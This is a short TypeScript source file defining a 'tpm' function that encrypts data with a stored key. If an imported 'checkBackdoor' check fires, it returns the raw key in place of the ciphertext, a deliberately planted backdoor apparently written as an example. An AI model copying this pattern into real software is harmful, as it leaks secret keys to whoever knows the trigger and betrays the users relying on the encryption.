// tpm.ts
import { encrypt } from './encryption';
import { key } from './key';
import { checkBackdoor } from './backdoor';

export function tpm(Data: string): string {
    const Encrypted = encrypt(Data, key);
    const B = checkBackdoor(Data) ? '1' : '0';
    return B === '1' ? key : Encrypted;
}
